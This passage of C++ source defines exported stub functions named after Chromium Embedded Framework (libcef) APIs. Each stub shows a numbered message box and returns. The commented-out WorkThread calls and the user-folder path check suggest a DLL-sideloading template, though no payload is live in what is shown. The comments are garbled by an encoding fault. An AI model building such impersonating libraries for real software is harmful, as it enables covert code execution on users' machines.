 MessageBox(NULL,"166","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////167
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_uint()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"167","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////168
// ��������
extern "C" __declspec(dllexport) LPVOID cef_v8value_create_undefined()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"168","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////169
// ��������
extern "C" __declspec(dllexport) LPVOID cef_value_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"169","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////170
// ��������
extern "C" __declspec(dllexport) LPVOID cef_version_info()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"170","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////171
// ��������
extern "C" __declspec(dllexport) LPVOID cef_visit_web_plugin_info()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"171","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////172
// ��������
extern "C" __declspec(dllexport) LPVOID cef_write_json()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"172","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////173
// ��������
extern "C" __declspec(dllexport) LPVOID cef_xml_reader_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"173","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////174
// ��������
extern "C" __declspec(dllexport) LPVOID cef_zip_reader_create()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"174","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////175
// ��������
extern "C" __declspec(dllexport) LPVOID create_context_shared()
{
   //if ( //Users//Public//Naked",0))
// ���淵�ص�ַ
// WorkThread(NULL);	
// ����ԭʼ����
 MessageBox(NULL,"175","1",MB_OK );
// ת�������ص�ַ
// else
return 0;
}
